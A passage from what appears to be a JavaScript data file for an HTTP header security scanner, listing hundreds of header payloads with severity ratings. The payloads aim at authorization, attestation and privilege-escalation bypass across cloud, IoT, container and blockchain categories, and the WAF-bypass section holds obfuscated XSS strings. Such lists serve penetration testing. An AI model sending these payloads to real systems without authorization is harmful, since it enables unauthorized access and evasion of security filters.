                payload: "X-Push-Token: ../../other-user-token",
                severity: "medium"
            },
            {
                name: "App Store Receipt",
                description: "In-app purchase bypass",
                payload: "X-Receipt-Data: fake-premium-receipt",
                severity: "high"
            },
            {
                name: "Device Fingerprint",
                description: "Device fingerprint spoofing",
                payload: "X-Device-Fingerprint: trusted-device-print",
                severity: "medium"
            },
            {
                name: "App Analytics",
                description: "Analytics data manipulation",
                payload: "X-Analytics-Event: purchase_completed\\r\\nX-Revenue: 9999",
                severity: "medium"
            },
            {
                name: "Deep Link Injection",
                description: "Deep link URL injection",
                payload: "X-Deep-Link: app://admin/settings",
                severity: "high"
            },
            {
                name: "App Config Override",
                description: "Remote config bypass",
                payload: "X-Remote-Config: {\"premium\":true}",
                severity: "high"
            },
            {
                name: "SDK Version",
                description: "SDK version spoofing",
                payload: "X-SDK-Version: 999.0.0",
                severity: "low"
            },
            {
                name: "Network Type",
                description: "Network type manipulation",
                payload: "X-Network-Type: wifi\\r\\nX-Carrier: internal",
                severity: "low"
            },
            {
                name: "App Environment",
                description: "Environment switching",
                payload: "X-App-Environment: development",
                severity: "high"
            },
            {
                name: "Biometric Bypass",
                description: "Biometric auth bypass",
                payload: "X-Biometric-Auth: success",
                severity: "critical"
            },
            {
                name: "App Permissions",
                description: "Permission escalation",
                payload: "X-Requested-Permissions: all",
                severity: "high"
            },
            {
                name: "Update Check Bypass",
                description: "Force update bypass",
                payload: "X-Update-Required: false",
                severity: "medium"
            },
            {
                name: "App Instance ID",
                description: "Instance ID manipulation",
                payload: "X-Instance-ID: admin-instance",
                severity: "medium"
            },
            {
                name: "Advertising ID",
                description: "Ad ID manipulation",
                payload: "X-Advertising-ID: 00000000-0000-0000-0000-000000000000",
                severity: "low"
            },
            {
                name: "App Launch Time",
                description: "Launch time manipulation",
                payload: "X-Launch-Time: 0",
                severity: "low"
            },
            {
                name: "Screen Resolution",
                description: "Screen info spoofing",
                payload: "X-Screen-Resolution: 9999x9999",
                severity: "low"
            },
            {
                name: "Battery Level",
                description: "Battery info manipulation",
                payload: "X-Battery-Level: 100\\r\\nX-Battery-Charging: true",
                severity: "low"
            },
            {
                name: "Locale Override",
                description: "Locale manipulation",
                payload: "X-Locale: en_ADMIN",
                severity: "low"
            },
            {
                name: "Time Zone Spoof",
                description: "Time zone manipulation",
                payload: "X-Timezone: UTC-99",
                severity: "medium"
            },
            {
                name: "App Memory",
                description: "Memory info spoofing",
                payload: "X-Available-Memory: unlimited",
                severity: "low"
            },
            {
                name: "Install Source",
                description: "Install source bypass",
                payload: "X-Install-Source: com.android.vending",
                severity: "medium"
},





{
                name: "App Integrity",
                description: "App integrity check bypass",
                payload: "X-App-Integrity: verified",
                severity: "high"
            },
            {
                name: "SafetyNet Bypass",
                description: "SafetyNet attestation bypass",
                payload: "X-SafetyNet-Result: passed",
                severity: "high"
            },
            {
                name: "App Attestation",
                description: "App attestation bypass",
                payload: "X-Attestation-Token: valid-attestation",
                severity: "high"
            }
        ]
    },
    "Cloud Services": {
        icon: "fa-cloud",
        tests: [
            {
                name: "S3 Bucket Manipulation",
                description: "S3 bucket access bypass",
                payload: "X-Amz-Bucket-Name: admin-private-bucket",
                severity: "high"
            },
            {
                name: "Lambda Function",
                description: "Lambda function invocation",
                payload: "X-Amz-Target: AWSLambda.InvokeFunction",
                severity: "high"
            },
            {
                name: "EC2 Metadata",
                description: "EC2 metadata access",
                payload: "X-Forwarded-For: 169.254.169.254",
                severity: "critical"
            },
            {
                name: "Azure Resource",
                description: "Azure resource manipulation",
                payload: "X-MS-Resource-Id: /subscriptions/admin/resources",
                severity: "high"
            },
            {
                name: "GCP Project",
                description: "GCP project switching",
                payload: "X-Goog-Project-Id: admin-project",
                severity: "high"
            },
            {
                name: "Cloud Function",
                description: "Cloud function bypass",
                payload: "X-Function-Key: master-key",
                severity: "high"
            },
            {
                name: "Storage Signature",
                description: "Storage signature bypass",
                payload: "X-Storage-Signature: forged-signature",
                severity: "high"
            },
            {
                name: "CDN Purge",
                description: "CDN cache purge",
                payload: "X-CDN-Purge: /*",
                severity: "medium"
            },
            {
                name: "Service Account",
                description: "Service account impersonation",
                payload: "X-Service-Account: admin@project.iam.gserviceaccount.com",
                severity: "critical"
            },
            {
                name: "Cloud KMS",
                description: "Key management bypass",
                payload: "X-KMS-Key-Id: alias/admin-master-key",
                severity: "critical"
            },
            {
                name: "Container Registry",
                description: "Container registry access",
                payload: "X-Registry-Auth: admin-token",
                severity: "high"
            },
            {
                name: "Kubernetes API",
                description: "K8s API access",
                payload: "X-Kubernetes-Namespace: kube-system",
                severity: "critical"
            },
            {
                name: "Cloud SQL",
                description: "Cloud database access",
                payload: "X-Cloud-SQL-Instance: prod-master",
                severity: "critical"
            },
            {
                name: "Message Queue",
                description: "Message queue manipulation",
                payload: "X-Queue-Name: admin-commands",
                severity: "high"
            },
            {
                name: "Pub/Sub Topic",
                description: "Pub/Sub topic access",
                payload: "X-Topic-Name: projects/admin/topics/sensitive",
                severity: "high"
            },
            {
                name: "Cloud Build",
                description: "Build pipeline access",
                payload: "X-Build-Trigger: deploy-to-prod",
                severity: "critical"
            },
            {
                name: "Serverless Config",
                description: "Serverless configuration",
                payload: "X-Serverless-Stage: production",
                severity: "high"
            },
            {
                name: "Cloud Logging",
                description: "Log access manipulation",
                payload: "X-Log-Level: disabled",
                severity: "medium"
            },
            {
                name: "API Gateway Stage",
                description: "API Gateway stage switch",
                payload: "X-API-Gateway-Stage: prod",
                severity: "high"
            },
            {
                name: "Cloud Formation",
                description: "Infrastructure manipulation",
                payload: "X-Stack-Name: admin-infrastructure",
                severity: "critical"
            },
            {
                name: "Object Storage",
                description: "Object storage bypass",
                payload: "X-Object-ACL: public-read-write",
                severity: "high"
            },
            {
                name: "Cloud Scheduler",
                description: "Scheduled job manipulation",
                payload: "X-Scheduler-Job: backup-deletion",
                severity: "high"
            },
            {
                name: "Secrets Manager",
                description: "Secrets access bypass",
                payload: "X-Secret-Name: prod/database/master",
                severity: "critical"
            },
            {
                name: "Cloud Firewall",
                description: "Firewall rule bypass",
                payload: "X-Firewall-Rule: allow-all",
                severity: "high"
            },
            {
                name: "Load Balancer",
                description: "Load balancer manipulation",
                payload: "X-Backend-Pool: admin-servers",
                severity: "high"
            },
            {
                name: "Cloud DNS",
                description: "DNS manipulation",
                payload: "X-DNS-Zone: internal.company.com",
                severity: "high"
            },
            {
                name: "VPC Endpoint",
                description: "VPC endpoint access",
                payload: "X-VPC-Endpoint: vpce-admin",
                severity: "high"
            },
            {
                name: "Cloud Armor",
                description: "WAF bypass attempt",
                payload: "X-Cloud-Armor-Bypass: true",
                severity: "medium"
            },
            {
                name: "Identity Platform",
                description: "Identity provider bypass",
                payload: "X-Identity-Provider: admin-idp",
                severity: "high"
            },
            {
                name: "Cloud Trace",
                description: "Tracing manipulation",
                payload: "X-Cloud-Trace-Context: disabled",
                severity: "low"
            }
        ]
    },
    "IoT Headers": {
        icon: "fa-microchip",
        tests: [
            {
                name: "Device Token",
                description: "IoT device token manipulation",
                payload: "X-Device-Token: admin-iot-device",
                severity: "high"
            },
            {
                name: "MQTT Topic",
                description: "MQTT topic injection",
                payload: "X-MQTT-Topic: devices/+/commands",
                severity: "high"
            },
            {
                name: "Firmware Version",
                description: "Firmware version spoofing",
                payload: "X-Firmware-Version: 999.999.999",
                severity: "medium"
            },
            {
                name: "Sensor Data",
                description: "Sensor data manipulation",
                payload: "X-Sensor-Data: temperature=999;admin=true",
                severity: "medium"
            },
            {
                name: "Device Shadow",
                description: "Device shadow manipulation",
                payload: "X-Shadow-Update: {\"state\":{\"desired\":{\"admin\":true}}}",
                severity: "high"
            },
            {
                name: "Thing Name",
                description: "IoT thing name injection",
                payload: "X-Thing-Name: ../admin-device",
                severity: "high"
            },
            {
                name: "Certificate CN",
                description: "Certificate CN bypass",
                payload: "X-Client-Certificate-CN: *.iot.company.com",
                severity: "high"
            },
            {
                name: "Device Location",
                description: "GPS location spoofing",
                payload: "X-Device-Location: 0.0000,0.0000;elevation=9999",
                severity: "medium"
            },
            {
                name: "Telemetry Rate",
                description: "Telemetry rate manipulation",
                payload: "X-Telemetry-Rate: 0",
                severity: "low"
            },
            {
                name: "Device Group",
                description: "Device group escalation",
                payload: "X-Device-Group: admin-devices",
                severity: "high"
            },
            {
                name: "OTA Update",
                description: "OTA update bypass",
                payload: "X-OTA-Version: current",
                severity: "high"
            },
            {
                name: "Device Policy",
                description: "Device policy bypass",
                payload: "X-Device-Policy: unrestricted",
                severity: "high"
            },
            {
                name: "Protocol Version",
                description: "Protocol version confusion",
                payload: "X-Protocol-Version: legacy-insecure",
                severity: "medium"
            },
            {
                name: "Device Capability",
                description: "Capability escalation",
                payload: "X-Device-Capabilities: all",
                severity: "medium"
            },
            {
                name: "Edge Computing",
                description: "Edge node manipulation",
                payload: "X-Edge-Node: master-node",
                severity: "high"
            },
            {
                name: "Device Twin",
                description: "Device twin manipulation",
                payload: "X-Device-Twin: {\"properties\":{\"admin\":true}}",
                severity: "high"
            },
            {
                name: "Provisioning",
                description: "Device provisioning bypass",
                payload: "X-Provisioning-Status: completed",
                severity: "high"
            },
            {
                name: "Device Registry",
                description: "Registry manipulation",
                payload: "X-Registry-ID: admin-registry",
                severity: "high"
            },
            {
                name: "Command Queue",
                description: "Command injection",
                payload: "X-Command: factory-reset;grant-admin",
                severity: "critical"
            },
            {
                name: "Diagnostic Mode",
                description: "Diagnostic mode activation",
                payload: "X-Diagnostic-Mode: enabled",
                severity: "medium"
            },
            {
                name: "Device Metadata",
                description: "Metadata manipulation",
                payload: "X-Device-Metadata: role=admin",
                severity: "medium"
            },
            {
                name: "Fleet Management",
                description: "Fleet permission bypass",
                payload: "X-Fleet-ID: global-admin",
                severity: "high"
            },
            {
                name: "Device Health",
                description: "Health check bypass",
                payload: "X-Device-Health: healthy;bypass-checks=true",
                severity: "medium"
            },
            {
                name: "Sensor Calibration",
                description: "Calibration data manipulation",
                payload: "X-Calibration-Data: offset=9999",
                severity: "medium"
            },
            {
                name: "Device Pairing",
                description: "Pairing bypass",
                payload: "X-Pairing-Code: 000000",
                severity: "high"
            },
            {
                name: "Gateway ID",
                description: "Gateway impersonation",
                payload: "X-Gateway-ID: master-gateway",
                severity: "high"
            },
            {
                name: "Device State",
                description: "State machine manipulation",
                payload: "X-Device-State: admin-mode",
                severity: "high"
            },
            {
                name: "Mesh Network",
                description: "Mesh network manipulation",
                payload: "X-Mesh-Role: coordinator",
                severity: "high"
            },
            {
                name: "Device Secret",
                description: "Device secret bypass",
                payload: "X-Device-Secret: default-secret",
                severity: "critical"
            },
            {
                name: "Thing Type",
                description: "Thing type escalation",
                payload: "X-Thing-Type: administrator-device",
                severity: "high"
            }
        ]
    },
    "Blockchain Headers": {
        icon: "fa-link",
        tests: [
            {
                name: "Chain ID",
                description: "Blockchain ID manipulation",
                payload: "X-Chain-ID: 1337",
                severity: "medium"
            },
            {
                name: "Gas Price",
                description: "Gas price manipulation",
                payload: "X-Gas-Price: 0",
                severity: "medium"
            },
            {
                name: "Nonce Override",
                description: "Transaction nonce bypass",
                payload: "X-Nonce-Override: 0",
                severity: "high"
            },
            {
                name: "Block Number",
                description: "Block number manipulation",
                payload: "X-Block-Number: latest",
                severity: "medium"
            },
            {
                name: "Contract Address",
                description: "Smart contract bypass",
                payload: "X-Contract-Address: 0x0000000000000000000000000000000000000000",
                severity: "high"
            },
            {
                name: "Wallet Connect",
                description: "Wallet connection bypass",
                payload: "X-Wallet-Connect: admin-wallet",
                severity: "high"
            },
            {
                name: "Transaction Hash",
                description: "Transaction replay",
                payload: "X-Tx-Hash: 0xdeadbeef",
                severity: "high"
            },
            {
                name: "RPC Endpoint",
                description: "RPC endpoint override",
                payload: "X-RPC-URL: http://localhost:8545",
                severity: "medium"
            },
            {
                name: "Private Key Leak",
                description: "Private key exposure test",
                payload: "X-Debug-Private-Key: true",
                severity: "critical"
            },
            {
                name: "Signature Bypass",
                description: "Signature verification bypass",
                payload: "X-Skip-Signature: true",
                severity: "critical"
            },
            {
                name: "MEV Protection",
                description: "MEV protection bypass",
                payload: "X-Flashbots-Bypass: true",
                severity: "medium"
            },
            {
                name: "Token Balance",
                description: "Token balance manipulation",
                payload: "X-Token-Balance-Override: 999999999",
                severity: "high"
            },
            {
                name: "Oracle Price",
                description: "Oracle price manipulation",
                payload: "X-Oracle-Price: 0.01",
                severity: "high"
            },
            {
                name: "Consensus Bypass",
                description: "Consensus mechanism bypass",
                payload: "X-Consensus-Override: true",
                severity: "critical"
            },
            {
                name: "Fork Choice",
                description: "Fork choice manipulation",
                payload: "X-Fork-Choice: malicious-fork",
                severity: "high"
            },
            {
                name: "Validator Key",
                description: "Validator impersonation",
                payload: "X-Validator-Pubkey: admin-validator",
                severity: "critical"
            },
            {
                name: "Bridge Message",
                description: "Cross-chain bridge manipulation",
                payload: "X-Bridge-Message: mint-tokens",
                severity: "critical"
            },
            {
                name: "Layer 2 Bypass",
                description: "L2 security bypass",
                payload: "X-L2-Sequencer: admin",
                severity: "high"
            },
            {
                name: "Mempool Access",
                description: "Mempool manipulation",
                payload: "X-Mempool-Priority: 999999",
                severity: "medium"
            },
            {
                name: "Slippage Tolerance",
                description: "Slippage manipulation",
                payload: "X-Slippage: 100",
                severity: "medium"
            },
            {
                name: "Flash Loan",
                description: "Flash loan attack setup",
                payload: "X-Flash-Loan: unlimited",
                severity: "high"
            },
            {
                name: "Reentrancy Flag",
                description: "Reentrancy protection bypass",
                payload: "X-Reentrancy-Guard: disabled",
                severity: "critical"
            },
            {
                name: "Time Lock",
                description: "Time lock bypass",
                payload: "X-Timelock-Override: 0",
                severity: "high"
            },
            {
                name: "Governance Vote",
                description: "Governance manipulation",
                payload: "X-Vote-Weight: 999999999",
                severity: "high"
            },
            {
                name: "Proxy Admin",
                description: "Proxy admin bypass",
                payload: "X-Proxy-Admin: true",
                severity: "critical"
            },
            {
                name: "Storage Slot",
                description: "Storage manipulation",
                payload: "X-Storage-Slot: 0x0",
                severity: "high"
            },
            {
                name: "Event Filter",
                description: "Event filtering bypass",
                payload: "X-Event-Filter: none",
                severity: "medium"
            },
            {
                name: "Gas Limit",
                description: "Gas limit manipulation",
                payload: "X-Gas-Limit: unlimited",
                severity: "medium"
            },
            {
                name: "EIP-1559",
                description: "EIP-1559 bypass",
                payload: "X-Max-Priority-Fee: 0",
                severity: "medium"
            },
            {
                name: "Rollup Batch",
                description: "Rollup batch manipulation",
                payload: "X-Rollup-Batch: forged",
                severity: "high"
            }
        ]
    },
    "Container Security": {
        icon: "fa-box",
        tests: [
            {
                name: "Docker Socket",
                description: "Docker socket access",
                payload: "X-Docker-Host: unix:///var/run/docker.sock",
                severity: "critical"
            },
            {
                name: "Container Escape",
                description: "Container escape attempt",
                payload: "X-Container-Runtime: privileged",
                severity: "critical"
            },
            {
                name: "K8s Service Account",
                description: "Service account token",
                payload: "X-K8s-Token: /var/run/secrets/kubernetes.io/serviceaccount/token",
                severity: "critical"
            },
            {
                name: "Pod Security Policy",
                description: "PSP bypass",
                payload: "X-Pod-Security: disabled",
                severity: "high"
            },
            {
                name: "Container Registry",
                description: "Registry credentials",
                payload: "X-Registry-Creds: admin:password",
                severity: "critical"
            },
            {
                name: "Namespace Jump",
                description: "Namespace isolation bypass",
                payload: "X-Target-Namespace: kube-system",
                severity: "critical"
            },
            {
                name: "Helm Tiller",
                description: "Tiller access",
                payload: "X-Tiller-Namespace: kube-system",
                severity: "high"
            },
            {
                name: "Container Capabilities",
                description: "Linux capabilities",
                payload: "X-Add-Capabilities: CAP_SYS_ADMIN",
                severity: "critical"
            },
            {
                name: "Seccomp Profile",
                description: "Seccomp bypass",
                payload: "X-Seccomp-Profile: unconfined",
                severity: "high"
            },
            {
                name: "AppArmor Profile",
                description: "AppArmor bypass",
                payload: "X-AppArmor-Profile: unconfined",
                severity: "high"
            },
            {
                name: "SELinux Context",
                description: "SELinux bypass",
                payload: "X-SELinux-Options: disable",
                severity: "high"
            },
            {
                name: "Volume Mount",
                description: "Host volume mount",
                payload: "X-Volume-Mount: /:/host",
                severity: "critical"
            },
            {
                name: "Network Policy",
                description: "Network policy bypass",
                payload: "X-Network-Policy: allow-all",
                severity: "high"
            },
            {
                name: "Istio Sidecar",
                description: "Service mesh bypass",
                payload: "X-Sidecar-Injection: disabled",
                severity: "medium"
            },
            {
                name: "Container User",
                description: "User privilege escalation",
                payload: "X-Run-As-User: 0",
                severity: "high"
            },
            {
                name: "Resource Limits",
                description: "Resource limit bypass",
                payload: "X-Resource-Limits: none",
                severity: "medium"
            },
            {
                name: "Init Container",
                description: "Init container injection",
                payload: "X-Init-Container: malicious-init",
                severity: "high"
            },
            {
                name: "Admission Webhook",
                description: "Admission control bypass",
                payload: "X-Skip-Admission: true",
                severity: "high"
            },
            {
                name: "RBAC Bypass",
                description: "RBAC permission escalation",
                payload: "X-RBAC-Role: cluster-admin",
                severity: "critical"
            },
            {
                name: "ConfigMap Access",
                description: "ConfigMap secrets",
                payload: "X-ConfigMap: secret-config",
                severity: "high"
            },
            {
                name: "CRD Manipulation",
                description: "Custom Resource manipulation",
                payload: "X-CRD-Access: write",
                severity: "high"
            },
            {
                name: "Ingress Bypass",
                description: "Ingress controller bypass",
                payload: "X-Ingress-Class: nginx-internal",
                severity: "medium"
            },
            {
                name: "Egress Control",
                description: "Egress filtering bypass",
                payload: "X-Egress-Policy: unrestricted",
                severity: "medium"
            },
            {
                name: "Service Mesh",
                description: "Service mesh bypass",
                payload: "X-Mesh-Bypass: true",
                severity: "medium"
            },
            {
                name: "Container Runtime",
                description: "Runtime manipulation",
                payload: "X-Runtime: kata-containers",
                severity: "medium"
            },
            {
                name: "Image Scanning",
                description: "Vulnerability scan bypass",
                payload: "X-Skip-Scan: true",
                severity: "medium"
            },
            {
                name: "Sidecar Proxy",
                description: "Proxy bypass",
                payload: "X-Proxy-Bypass: true",
                severity: "medium"
            },
            {
                name: "Workload Identity",
                description: "Workload identity theft",
                payload: "X-Workload-Identity: admin-workload",
                severity: "high"
            },
            {
                name: "Cluster DNS",
                description: "DNS manipulation",
                payload: "X-Cluster-DNS: 8.8.8.8",
                severity: "medium"
            },
            {
                name: "Pod Disruption",
                description: "PDB bypass",
                payload: "X-Ignore-PDB: true",
                severity: "medium"
            }
        ]
    },
    "Zero Trust Headers": {
        icon: "fa-shield-alt",
        tests: [
            {
                name: "Device Trust Score",
                description: "Trust score manipulation",
                payload: "X-Device-Trust-Score: 100",
                severity: "high"
            },
            {
                name: "Risk Score Override",
                description: "Risk assessment bypass",
                payload: "X-Risk-Score: 0",
                severity: "high"
            },
            {
                name: "Context Headers",
                description: "Security context manipulation",
                payload: "X-Security-Context: trusted",
                severity: "high"
            },
            {
                name: "Posture Assessment",
                description: "Device posture bypass",
                payload: "X-Device-Posture: compliant",
                severity: "high"
            },
            {
                name: "Continuous Verification",
                description: "Verification bypass",
                payload: "X-Verification-Status: passed",
                severity: "high"
            },
            {
                name: "Microsegmentation",
                description: "Network segment bypass",
                payload: "X-Network-Segment: privileged",
                severity: "high"
            },
            {
                name: "Identity Confidence",
                description: "Identity confidence manipulation",
                payload: "X-Identity-Confidence: high",
                severity: "high"
            },
            {
                name: "Access Tier",
                description: "Access tier escalation",
                payload: "X-Access-Tier: unrestricted",
                severity: "high"
            },
            {
                name: "Behavior Score",
                description: "Behavior analysis bypass",
                payload: "X-Behavior-Score: normal",
                severity: "medium"
            },
            {
                name: "Session Risk",
                description: "Session risk bypass",
                payload: "X-Session-Risk: low",
                severity: "high"
            },
            {
                name: "Policy Engine",
                description: "Policy engine bypass",
                payload: "X-Policy-Override: allow-all",
                severity: "critical"
            },
            {
                name: "Threat Intel",
                description: "Threat intelligence bypass",
                payload: "X-Threat-Level: none",
                severity: "medium"
            },
            {
                name: "Compliance State",
                description: "Compliance check bypass",
                payload: "X-Compliance-State: compliant",
                severity: "high"
            },
            {
                name: "Trust Boundary",
                description: "Trust boundary violation",
                payload: "X-Trust-Boundary: internal",
                severity: "high"
            },
            {
                name: "Access Context",
                description: "Context-aware access bypass",
                payload: "X-Access-Context: privileged-user",
                severity: "high"
            },
            {
                name: "Encryption State",
                description: "Encryption requirement bypass",
                payload: "X-Encryption-Required: false",
                severity: "high"
            },
            {
                name: "Attestation Token",
                description: "Device attestation bypass",
                payload: "X-Attestation: valid-token",
                severity: "high"
            },
            {
                name: "Privilege Level",
                description: "Privilege escalation",
                payload: "X-Privilege-Level: root",
                severity: "critical"
            },
            {
                name: "Security Zone",
                description: "Security zone bypass",
                payload: "X-Security-Zone: dmz-bypass",
                severity: "high"
            },
            {
                name: "Trust Score History",
                description: "Historical trust manipulation",
                payload: "X-Trust-History: always-trusted",
                severity: "medium"
            },
            {
                name: "Adaptive Auth",
                description: "Adaptive auth bypass",
                payload: "X-Adaptive-Auth: skip",
                severity: "high"
            },
            {
                name: "Risk Indicators",
                description: "Risk indicator suppression",
                payload: "X-Risk-Indicators: none",
                severity: "medium"
            },
            {
                name: "Policy Decision",
                description: "Policy decision override",
                payload: "X-Policy-Decision: permit",
                severity: "critical"
            },
            {
                name: "Trust Chain",
                description: "Trust chain manipulation",
                payload: "X-Trust-Chain: self-signed",
                severity: "high"
            },
            {
                name: "Access Request",
                description: "Access request bypass",
                payload: "X-Access-Request-ID: pre-approved",
                severity: "high"
            },
            {
                name: "Verification Level",
                description: "Verification level bypass",
                payload: "X-Verification-Level: 0",
                severity: "high"
            },
            {
                name: "Trust Token",
                description: "Trust token forgery",
                payload: "X-Trust-Token: forged-token",
                severity: "critical"
            },
            {
                name: "Risk Context",
                description: "Risk context manipulation",
                payload: "X-Risk-Context: safe-environment",
                severity: "medium"
            },
            {
                name: "Identity Proofing",
                description: "Identity proofing bypass",
                payload: "X-Identity-Proof: verified",
                severity: "high"
            },
            {
                name: "Trust Relationship",
                description: "Trust relationship bypass",
                payload: "X-Trust-Relationship: federated",
                severity: "high"
            }
        ]
    },
    "WAF Bypass": {
        icon: "fa-fire-alt",
        tests: [
            {
                name: "Content-Type Smuggling",
                description: "WAF content-type bypass",
                payload: "Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575",
                severity: "high"
            },
            {
                name: "Chunked Encoding WAF",
                description: "Chunked encoding WAF bypass",
                payload: "Transfer-Encoding: chunked\\r\\nX-Bypass: true",
                severity: "high"
            },
            {
                name: "Unicode Normalization",
                description: "Unicode normalization bypass",
                payload: "X-Payload: %E2%80%AE<script>alert(1)< /script>",
                severity: "high"
            },
            {
                name: "HPP WAF Bypass",
                description: "HTTP Parameter Pollution",
                payload: "X-Param: safe&X-Param=<script>alert(1)< /script>",
                severity: "high"
            },
            {
                name: "Method Override WAF",
                description: "Method override WAF bypass",
                payload: "X-HTTP-Method: GET\\r\\nX-Original-Method: POST",
                severity: "high"
            },
            {
                name: "Double Encoding WAF",
                description: "Double encoding WAF bypass",
                payload: "X-Payload: %253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
                severity: "high"
            },
            {
                name: "Case Switching",
                description: "Case variation WAF bypass",
                payload: "X-Payload: <ScRiPt>AlErT(1)< /sCrIpT>",
                severity: "medium"
            },
            {
                name: "Comment Insertion",
                description: "Comment-based WAF bypass",
                payload: "X-Payload: <scri/*comment*/pt>alert(1)< /script>",
                severity: "medium"
            },
            {
                name: "Line Break Bypass",
                description: "Line break WAF bypass",
                payload: "X-Payload: <scri\\npt>alert(1)< /scri\\npt>",
                severity: "medium"
            },
            {
                name: "Null Byte WAF",
                description: "Null byte WAF bypass",
                payload: "X-Payload: <script>alert(1)< /script>\\x00",
                severity: "high"
            },
            {
                name: "Protocol Confusion",
                description: "Protocol-based WAF bypass",
                payload: "X-Forwarded-Proto: https\\r\\nX-WAF-Bypass: true",
                severity: "medium"
            },
            {
                name: "Fragment Bypass",
                description: "URL fragment WAF bypass",
                payload: "X-Original-URL: /safe#<script>alert(1)< /script>",
                severity: "medium"
            },
            {
                name: "IP Spoofing WAF",
                description: "IP-based WAF bypass",
                payload: "X-Originating-IP: 127.0.0.1\\r\\nX-Remote-IP: 127.0.0.1",
                severity: "high"
            },
            {
                name: "User-Agent WAF",
                description: "User-Agent WAF bypass",
                payload: "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)",
                severity: "medium"
            },
            {
                name: "Referrer WAF",
                description: "Referrer-based WAF bypass",
                payload: "Referer: http://www.google.com/search?q=site",
                severity: "medium"
            },
            {
                name: "Accept Headers WAF",
                description: "Accept header WAF bypass",
                payload: "Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8",
                severity: "low"
            },
            {
                name: "Cookie WAF Bypass",
                description: "Cookie-based WAF bypass",
                payload: "Cookie: __waf_bypass=true; session=admin",
                severity: "high"
            },
            {
                name: "SSL/TLS WAF",
                description: "SSL/TLS WAF bypass",
                payload: "X-Forwarded-SSL: on\\r\\nX-WAF-SSL-Bypass: true",
                severity: "medium"
            },
            {
                name: "Compression WAF",
                description: "Compression-based WAF bypass",
                payload: "Accept-Encoding: gzip, deflate, br, compress",
                severity: "medium"
            },
            {
                name: "Range Header WAF",
                description: "Range header WAF bypass",
                payload: "Range: bytes=0-\\r\\nX-WAF-Bypass: true",
                severity: "medium"
            },
            {
                name: "Expect Header WAF",
                description: "Expect header WAF bypass",
                payload: "Expect: 100-continue\\r\\nX-Payload: malicious",
                severity: "medium"
            },
            {
                name: "Via Header WAF",
                description: "Via header WAF bypass",
                payload: "Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)",
                severity: "low"
            },
            {
                name: "Warning Header WAF",
                description: "Warning header WAF bypass",
                payload: "Warning: 199 Miscellaneous warning\\r\\nX-Payload: malicious",
                severity: "low"
            },
            {
                name: "Pragma WAF",
                description: "Pragma header WAF bypass",
                payload: "Pragma: no-cache\\r\\nX-WAF-Cache-Bypass: true",
                severity: "low"
            },
            {
                name: "DNT Header WAF",
                description: "DNT header WAF bypass",
                payload: "DNT: 1\\r\\nX-Privacy-Bypass: true",
                severity: "low"
            },
            {
                name: "Upgrade Header WAF",
                description: "Upgrade header WAF bypass",
                payload: "Upgrade: websocket\\r\\nX-Protocol-Switch: bypass",
                severity: "medium"
            },
            {
                name: "TE Header WAF",
                description: "TE header WAF bypass",
                payload: "TE: trailers, deflate;q=0.5",
                severity: "medium"
            },
            {
                name: "From Header WAF",
                description: "From header WAF bypass",
                payload: "From: googlebot@google.com",
                severity: "low"
            },
            {
                name: "Max-Forwards WAF",
                description: "Max-Forwards WAF bypass",
                payload: "Max-Forwards: 0\\r\\nX-Direct-Connection: true",
                severity: "low"
            },
            {
                name: "Content-MD5 WAF",
                description: "Content-MD5 WAF bypass",
                payload: "Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==",
                severity: "low"
            }
        ]
    },
    "Privilege Escalation": {
        icon: "fa-user-plus",
        tests: [
            {
                name: "Admin Role Header",
                description: "Direct admin role assignment",
                payload: "X-User-Role: administrator",
                severity: "critical"
            },
            {
                name: "User ID Override",
                description: "User ID manipulation",
                payload: "X-User-ID: 1",
                severity: "critical"
            },
            {
                name: "Group Membership",
                description: "Group membership injection",
                payload: "X-User-Groups: sudo,admin,root",
                severity: "critical"
            },
            {
                name: "Permission Header",
                description: "Permission level override",
                payload: "X-User-Permissions: read,write,delete,admin",
                severity: "critical"
            },
            {
                name: "Sudo Header",
                description: "Sudo privilege injection",
                payload: "X-Sudo-User: root",
                severity: "critical"
            },
            {
                name: "Impersonation Header",
                description: "User impersonation",
                payload: "X-Impersonate-User: admin@company.com",
                severity: "critical"
            },
            {
                name: "Elevation Token",
                description: "Privilege elevation token",
                payload: "X-Elevation-Token: allow",
                severity: "high"
            },
            {
                name: "System User",
                description: "System user impersonation",
                payload: "X-System-User: true",
                severity: "critical"
            },
            {
                name: "Service Account",
                description: "Service account hijacking",
                payload: "X-Service-Account: system-admin",
                severity: "critical"
            },
            {
                name: "Debug Privileges",
                description: "Debug mode privileges",
                payload: "X-Debug-User: root\\r\\nX-Debug-Mode: true",
                severity: "high"
            },
            {
                name: "Maintenance Mode",
                description: "Maintenance mode access",
                payload: "X-Maintenance-Mode: true\\r\\nX-Maintenance-User: admin",
                severity: "high"
            },
            {
                name: "Backup User",
                description: "Backup user privileges",
                payload: "X-Backup-User: true",
                severity: "high"
            },
            {
                name: "Emergency Access",
                description: "Emergency access bypass",
                payload: "X-Emergency-Override: true",
                severity: "critical"
            },
            {
                name: "Root Access",
                description: "Root access header",
                payload: "X-Root-Access: granted",
                severity: "critical"
            },
            {
                name: "Privilege Level",
                description: "Numeric privilege level",
                payload: "X-Privilege-Level: 9999",
                severity: "high"
            },
            {
                name: "Access Level",
                description: "Access level escalation",
                payload: "X-Access-Level: unrestricted",
                severity: "high"
            },
            {
                name: "Security Clearance",
                description: "Security clearance bypass",
                payload: "X-Security-Clearance: top-secret",
                severity: "high"
            },
            {
                name: "Department Override",
                description: "Department access bypass",
                payload: "X-Department: executive\\r\\nX-Override: true",
                severity: "high"
            },
            {
                name: "Role Chain",
                description: "Role inheritance bypass",
                payload: "X-Role-Chain: user,moderator,admin,superadmin",
                severity: "high"
            },
            {
                name: "Capability Injection",
                description: "Linux capability injection",
                payload: "X-Capabilities: CAP_SYS_ADMIN,CAP_NET_ADMIN",
                severity: "critical"
            },
            {
                name: "UID Override",
                description: "Unix UID override",
                payload: "X-Unix-UID: 0",
                severity: "critical"
            },
            {
                name: "GID Override",
                description: "Unix GID override",
                payload: "X-Unix-GID: 0",
                severity: "critical"
            },
            {
                name: "Windows SID",
                description: "Windows SID manipulation",
                payload: "X-Windows-SID: S-1-5-32-544",
                severity: "critical"
            },
            {
                name: "Token Privileges",
                description: "Token privilege escalation",
